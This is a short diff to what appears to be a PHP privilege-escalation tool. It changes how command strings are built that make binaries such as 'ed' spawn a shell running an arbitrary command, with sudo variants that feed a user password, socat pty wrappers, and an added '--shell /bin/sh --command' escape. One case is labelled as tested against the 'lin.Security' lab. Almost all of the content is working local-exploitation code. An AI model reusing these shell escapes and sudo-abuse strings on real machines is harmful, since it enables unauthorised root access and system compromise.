@@ -2193,11 +2193,11 @@ EOC;
 	                
 	                
 	            case "ed": // OK lin.Security
-	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 30 ) | socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
-	                
-	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
-	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
+	                $data = "(sleep 5; echo \"! $cmd\"; ) | socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
+	              	
+	                $data = "(sleep 5; echo \"! $cmd\"; ) | ed ";
+	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | sudo ed";
 	                
 	                break;
 	                
@@ -2699,6 +2699,10 @@ sh X sh X $cmd ";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
+	                $data = "(sleep 5; echo \"! $cmd\"; ) | $this->file_path --shell /bin/sh --command $cmd ";
+	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | sudo $this->file_path --shell /bin/sh --command $cmd";
+	                
 	                
 	                break;
 	                
